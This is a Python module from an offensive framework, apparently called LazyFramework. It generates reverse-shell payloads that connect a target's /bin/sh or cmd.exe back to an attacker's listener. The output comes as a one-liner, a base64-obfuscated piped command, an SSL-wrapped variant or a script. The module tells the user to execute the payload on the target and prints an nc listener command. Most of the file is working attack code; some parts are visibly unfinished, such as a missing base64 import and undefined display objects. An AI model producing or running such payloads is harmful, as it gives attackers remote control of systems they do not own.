# /root/lazy1/modules/payloads/reverse/linux/python_tcp.py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

MODULE_INFO = {
    "name": "Python Reverse TCP (Multi-Platform)",
    "description": "Python reverse shell for Linux, Windows, and macOS with advanced features",
    "author": "LazyFramework Team",
    "license": "MIT", 
    "platform": "Multi",
    "arch": "Python",
    "rank": "Excellent",
    "dependencies": []
}

OPTIONS = {
    "lhost": {
        "description": "Listener IP address",
        "required": True,
        "default": "192.168.1.100"
    },
    "lport": {
        "description": "Listener port",
        "required": True, 
        "default": "4444"
    },
    "python_version": {
        "description": "Python version",
        "required": False,
        "default": "3",
        "choices": ["2", "3", "both", "auto"]
    },
    "platform": {
        "description": "Target platform",
        "required": False,
        "default": "linux",
        "choices": ["linux", "windows", "macos", "multi"]
    },
    "method": {
        "description": "Execution method",
        "required": False,
        "default": "oneliner",
        "choices": ["oneliner", "script", "base64", "compressed"]
    },
    "ssl": {
        "description": "Use SSL encryption",
        "required": False,
        "default": "false",
        "choices": ["true", "false"]
    }
}

def generate_python_reverse(lhost, lport, python_version="3", platform="linux", method="oneliner", ssl=False):
    """Generate multi-platform Python reverse shell"""
    
    # Base Python payload
    if platform == "windows":
        shell_cmd = "cmd.exe"
    else:
        shell_cmd = "/bin/sh"
    
    if ssl:
        py2_payload = f'''
import socket,subprocess,ssl
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
ssl_s=ssl.wrap_socket(s)
subprocess.call(["{shell_cmd}","-i"],stdin=ssl_s.fileno(),stdout=ssl_s.fileno(),stderr=ssl_s.fileno())
'''
        py3_payload = f'''
import socket,subprocess,ssl
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
ssl_s=ssl.create_default_context().wrap_socket(s,server_hostname="{lhost}")
subprocess.call(["{shell_cmd}","-i"],stdin=ssl_s.fileno(),stdout=ssl_s.fileno(),stderr=ssl_s.fileno())
'''
    else:
        py2_payload = f'''
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1) 
os.dup2(s.fileno(),2)
subprocess.call(["{shell_cmd}","-i"])
'''
        py3_payload = py2_payload
    
    # Format based on method and version
    if method == "oneliner":
        if python_version in ["2", "both", "auto"]:
            py2_oneliner = f"python -c \"{py2_payload.replace(chr(10), ';').replace('  ', ' ')}\""
        if python_version in ["3", "both", "auto"]:
            py3_oneliner = f"python3 -c \"{py3_payload.replace(chr(10), ';').replace('  ', ' ')}\""
        
        if python_version == "2":
            return py2_oneliner
        elif python_version == "3":
            return py3_oneliner
        else:
            return f"{py2_oneliner}\n{py3_oneliner}"
    
    elif method == "base64":
        if python_version in ["2", "both", "auto"]:
            py2_encoded = base64.b64encode(py2_payload.encode()).decode()
            py2_cmd = f"echo '{py2_encoded}' | base64 -d | python"
        if python_version in ["3", "both", "auto"]:
            py3_encoded = base64.b64encode(py3_payload.encode()).decode()
            py3_cmd = f"echo '{py3_encoded}' | base64 -d | python3"
        
        if python_version == "2":
            return py2_cmd
        elif python_version == "3":
            return py3_cmd
        else:
            return f"{py2_cmd}\n{py3_cmd}"
    
    elif method == "script":
        if python_version in ["2", "both", "auto"]:
            py2_script = f"# Python 2 Reverse Shell\n{py2_payload}"
        if python_version in ["3", "both", "auto"]:
            py3_script = f"# Python 3 Reverse Shell\n{py3_payload}"
        
        if python_version == "2":
            return py2_script
        elif python_version == "3":
            return py3_script
        else:
            return f"{py2_script}\n\n{py3_script}"
    
    return py3_payload

def run(session, options):
    lhost = options.get("lhost", "192.168.1.100")
    lport = options.get("lport", "4444")
    py_version = options.get("python_version", "3")
    platform = options.get("platform", "linux")
    method = options.get("method", "oneliner")
    ssl = options.get("ssl", "false").lower() == "true"
    
    console.print("\n[bold green]🐍 Python Reverse TCP (Multi-Platform)[/bold green]")
    console.print("=" * 60)
    
    payload = generate_python_reverse(lhost, lport, py_version, platform, method, ssl)
    
    # Display information
    info_table = Table(show_header=True, header_style="bold cyan", box=box.ROUNDED)
    info_table.add_column("Parameter", style="green")
    info_table.add_column("Value", style="yellow")
    
    info_table.add_row("Listener", f"{lhost}:{lport}")
    info_table.add_row("Platform", platform)
    info_table.add_row("Python Version", py_version)
    info_table.add_row("Method", method)
    info_table.add_row("SSL/TLS", str(ssl))
    info_table.add_row("Shell", "cmd.exe" if platform == "windows" else "/bin/sh")
    
    console.print(info_table)
    
    console.print(f"\n[bold yellow]📦 Generated Payload:[/bold yellow]")
    console.print(Panel(payload, border_style="red"))
    
    console.print(f"\n[bold green]🚀 Usage:[/bold green]")
    if method == "oneliner":
        console.print("1. Copy the command")
        console.print("2. Execute on target system")
    elif method == "base64":
        console.print("1. Copy the entire command")
        console.print("2. Execute on Unix-like systems")
    elif method == "script":
        console.print("1. Save as .py file")
        console.print("2. Run: python script.py")
    
    console.print(f"\n[bold blue]🎯 Listener:[/bold blue]")
    if ssl:
        console.print(f"Use socat with SSL or ncat with --ssl")
    else:
        console.print(f"nc -lnvp {lport}")
    
    return payload
